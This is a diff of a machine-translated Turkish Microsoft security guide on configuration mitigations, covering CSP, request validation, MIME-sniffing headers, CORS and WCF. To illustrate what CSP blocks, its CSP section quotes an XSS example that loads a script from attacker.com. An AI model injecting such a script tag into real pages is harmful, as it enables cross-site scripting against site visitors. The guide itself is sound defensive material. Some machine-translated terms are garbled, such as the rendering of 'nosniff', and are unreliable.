@@ -16,12 +16,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
-ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
+ms.openlocfilehash: 811feb26e492efeb505f43202bee484d3edfb8a5
+ms.sourcegitcommit: fdec8e8bdbddcce5b7a0c4ffc6842154220c8b90
 ms.translationtype: MT
 ms.contentlocale: tr-TR
-ms.lasthandoff: 04/28/2020
-ms.locfileid: "82204262"
+ms.lasthandoff: 05/19/2020
+ms.locfileid: "83658611"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Güvenlik çerçevesi: yapılandırma yönetimi | Karşı 
 | Ürün/hizmet | Makale |
@@ -33,7 +33,7 @@ ms.locfileid: "82204262"
 | **IoT alan ağ geçidi** | <ul><li>[Bit dolabı ile işletim sistemi ve IoT alan ağ geçidinin ek bölümlerini şifreleme](#field-bit-locker)</li><li>[Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun](#default-change)</li></ul> |
 | **IoT bulut ağ geçidi** | <ul><li>[Bulut ağ geçidinin bağlı cihazlar belleniminin güncel tutulması için bir işlem uyguladığından emin olun](#cloud-firmware)</li></ul> |
 | **Makine güven sınırı** | <ul><li>[Cihazların kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
-| **Azure Storage** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimi sağlama](#secure-keys)</li><li>[CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-storage)</li></ul> |
+| **Azure Depolama** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimi sağlama](#secure-keys)</li><li>[CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[WCF 'nin hizmet azaltma özelliğini etkinleştir](#throttling)</li><li>[WCF-meta veriler aracılığıyla bilgilerin açıklanması](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Içerik Güvenlik Ilkesi (CSP) uygulama ve satır içi JavaScript 'i devre dışı bırakma
@@ -45,7 +45,7 @@ ms.locfileid: "82204262"
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | İçerik [güvenlik Ilkesine giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Içerik güvenlik ilkesi başvurusu](https://content-security-policy.com/), [güvenlik özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [içerik güvenlik ilkesine giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, beyaz liste tabanlı bir ilkedir. bir Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>Ekle `<script>malicious code</script>`. Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>Ekle `<script src="http://attacker.com/maliciousCode.js"/>`. Bu yararlanma, saldırgan tarafından denetlenen etki alanı CSP 'nin beyaz etki alanları listesinde yer almasından bu yana çalışmayacak</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP 'nin beyaz listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |
+| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, beyaz liste tabanlı bir ilkedir. bir Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>Ekle `<script>malicious code</script>` . Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>Ekle `<script src="http://attacker.com/maliciousCode.js"/>` . Bu yararlanma, saldırgan tarafından denetlenen etki alanı CSP 'nin beyaz etki alanları listesinde yer almasından bu yana çalışmayacak</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP 'nin beyaz listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |
 
 ### <a name="example"></a>Örnek
 Örnek ilke: 
@@ -176,7 +176,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 | **İlgili teknolojiler** | Web Forms, MVC5 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [İstek Doğrulama - Betik Saldırılarını Önleme](https://www.asp.net/whitepapers/request-validation) |
-| **Adımlar** | <p>Sürüm 1,1 ' den bu yana bir ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci betik kodu veya HTML 'nin bir sunucuya geri gönderilebildiği, depolandığı ve daha sonra diğer kullanıcılara sunulabildiği bazı betik ekleme saldırılarını önlemeye yardımcı olmak için tasarlanmıştır. Ayrıca, uygun olduğunda tüm giriş verilerini doğrulamanızı ve HTML 'in kodlanmasını kesinlikle öneririz.</p><p>İstek doğrulaması, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, ASP.NET başlatır `HttpRequestValidationException`. Varsayılan olarak, Istek doğrulama özelliği etkindir.</p>|
+| **Adımlar** | <p>Sürüm 1,1 ' den bu yana bir ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci betik kodu veya HTML 'nin bir sunucuya geri gönderilebildiği, depolandığı ve daha sonra diğer kullanıcılara sunulabildiği bazı betik ekleme saldırılarını önlemeye yardımcı olmak için tasarlanmıştır. Ayrıca, uygun olduğunda tüm giriş verilerini doğrulamanızı ve HTML 'in kodlanmasını kesinlikle öneririz.</p><p>İstek doğrulaması, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, ASP.NET başlatır `HttpRequestValidationException` . Varsayılan olarak, Istek doğrulama özelliği etkindir.</p>|
 
 ### <a name="example"></a>Örnek
 Ancak, bu özellik sayfa düzeyinde devre dışı bırakılabilir: 
@@ -212,7 +212,7 @@ Istek doğrulama özelliğinin desteklenmediğini ve MVC6 işlem hattının bir 
 | **SDL aşaması**               | Yapı |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [IE8 güvenlik bölümü V: kapsamlı koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
+| **Başvurular**              | [IE8 güvenlik bölümü V: kapsamlı koruma](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
 | **Adımlar** | X-Content-Type-Options üst bilgisi, geliştiricilerin içeriklerinin MIME önlenmesini belirtmelerine izin veren bir HTTP başlığıdır. Bu üstbilgi, MIME algılaması saldırılarını azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için, HTTP üstbilgisi X-Content-Type-Options: noalgılayıcılar f ' i kullanmanız gerekir. Gerekli üst bilgiyi uygulamadaki tüm sayfalar için genel olarak etkinleştirmek üzere aşağıdakilerden birini yapabilirsiniz|
 
 ### <a name="example"></a>Örnek
@@ -228,7 +228,7 @@ Uygulama Internet Information Services (IIS) 7 ' den barındırılıyorsa, Web. 
 ```
 
 ### <a name="example"></a>Örnek
-Genel uygulama\_BeginRequest aracılığıyla üstbilgiyi ekleyin 
+Genel uygulama BeginRequest aracılığıyla üstbilgiyi ekleyin \_ 
 ```csharp
 void Application_BeginRequest(object sender, EventArgs e)
 {
@@ -582,7 +582,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | Azure Storage | 
+| **Bileşen**               | Azure Depolama | 
 | **SDL aşaması**               | Dağıtım |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
@@ -593,7 +593,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | Azure Storage | 
+| **Bileşen**               | Azure Depolama | 
 | **SDL aşaması**               | Yapı |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
@@ -632,7 +632,7 @@ Aşağıda, azaltma etkin olan bir örnek yapılandırma verilmiştir:
 | **İlgili teknolojiler** | .NET Framework 3 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
-| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinme ve bir saldırı formu planı konusunda yardımcı olabilir. WCF Hizmetleri meta verileri açığa çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet açıklaması bilgileri sağlar ve üretim ortamlarında yayınlanmamalıdır. ServiceMetadata sınıfının `HttpsGetEnabled` özellikleri, bir hizmetin meta verileri kullanıma sunmayacağını tanımlar `HttpGetEnabled`  /  | 
+| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinme ve bir saldırı formu planı konusunda yardımcı olabilir. WCF Hizmetleri meta verileri açığa çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet açıklaması bilgileri sağlar ve üretim ortamlarında yayınlanmamalıdır. `HttpGetEnabled`  /  `HttpsGetEnabled` ServiceMetadata sınıfının özellikleri, bir hizmetin meta verileri kullanıma sunmayacağını tanımlar | 
 
 ### <a name="example"></a>Örnek
 Aşağıdaki kod, WCF 'nin bir hizmetin meta verilerini yayınmasını sağlar
